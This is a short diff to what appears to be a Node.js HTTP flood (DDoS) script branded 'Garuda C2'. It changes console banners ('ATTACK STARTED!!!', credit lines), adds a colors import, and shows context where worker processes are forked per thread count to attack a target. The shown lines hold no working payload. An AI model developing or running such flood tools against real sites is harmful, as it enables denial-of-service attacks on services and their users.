@@ -8,8 +8,9 @@ process.on('unhandledRejection', function(er) {
 });
 require('events').EventEmitter.defaultMaxListeners = 0;
 const fs = require('fs');
-const randstr = require('randomstring')
+const randstr = require('randomstring');
 const url = require('url');
+const colors = require('colors');
 
 var path = require("path");
 const cluster = require('cluster');
@@ -76,9 +77,9 @@ if (POSTDATA !== undefined){
 if (cluster.isMaster){
     for (let i = 0; i < process.argv[7]; i++){
         cluster.fork();
-        console.log(`(!) Threads ${i} Started Attacking`);
+        console.log(`ATTACK STARTED!!!`);
     }
-    console.log("(!) Now Attacked | Method By <3 WeAreRainBowHAT & <3 Felipe")
+    console.log(" Thanks For Use Garuda C2 | Terimakasih Karena telah menggunakan Garuda C2")
 
     setTimeout(() => {
         process.exit(1);
